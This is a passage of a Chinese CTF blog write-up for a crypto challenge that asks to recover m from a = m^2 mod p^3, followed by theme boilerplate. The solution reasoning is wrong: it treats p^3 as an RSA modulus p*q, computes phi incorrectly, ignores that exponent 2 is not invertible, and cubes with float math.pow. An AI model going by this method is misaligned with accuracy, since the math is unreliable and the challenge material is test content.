+<li>加解密：<code>c = (m ^ e) % n</code> ， <code>m = (c ^ d) % n</code> 。其中m为明文，c为密文，(n,e)为公钥对，d为私钥，要求 <code>0 &lt;= m &lt; n</code> 。</li>
+</ol>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">a=(m ^ 2) % p<span class="hljs-strong">**3</span><br><span class="hljs-strong">m = (a ^ d) % p**</span>3<br><br>flag = <span class="hljs-emphasis">&#x27;CBCTF&#123;&#x27;</span> <span class="hljs-code">+ sha256(str(m).encode()).hexdigest() +</span> <span class="hljs-emphasis">&#x27;&#125;&#x27;</span><br><br>&#x27;&#x27;&#x27;<br>p = 334032027984155099402863982848235447227<br>a = 6363500121827697008224968006879792916113549541401919095721781619316319436679204160344656454420382763358609215987320<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure>
+<p>核心问题就是求解m么，那我p，q知道了，pow(a,b,c)就是(a^b)mod c</p>
+<p>a = pow(m,2,p**3)</p>
+<p>其实意思就是</p>
+<p>a=(m ^ 2) % p**3</p>
+<p>a，p已知，想求m</p>
+<p>根据RSA理论，</p>
+<p>逆运算就是</p>
+<p>m = (a ^ d) % p**3</p>
+<p>用py实现就是m=pow(a,d,p**3)</p>
+<p>这样就能把m求出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cube</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">return</span> math.<span class="hljs-built_in">pow</span>(n, <span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure>
+<p>这样p^3就算出来了，</p>
+<p>然后m = (a ^ d) % p**3</p>
+<p>还缺私钥d</p>
+<p>私钥d好求</p>
+<p>按RSA的理论，,p**3=p  * q</p>
+<p>就一个未知数q</p>
+<p>你反解它很容易</p>
+<p>解出p，q，计算<code>phi = (p-1) * (q-1)</code> 。选取任意e，使得e满足 <code>1&lt;e&lt;phi</code> 且 <code>gcd(e , phi) == 1</code> 。计算e关于phi的模逆元d， 即d满足<code>(e * d)% phi ==1</code> 。</p>
+<p>这直接用工具一把梭了</p>
+<p>直接就出了</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101212200012.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>这样就解出来了</p>
+<p>比赛到1.1日，最后两个小时的时候，经过对原来之前密码学的复习，这题我想到思路了，但是我当时在做MISC的磁盘取证大题，就没来得及，很可惜</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2023年末_0rays招新赛</div>
+      <div>https://s0k1y.github.io/2024/01/01/CBCTF/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>s0k1y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/03/13/HGAME-WEEK1/" title="HGAME_WEEK1">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HGAME_WEEK1</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/flower.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script>
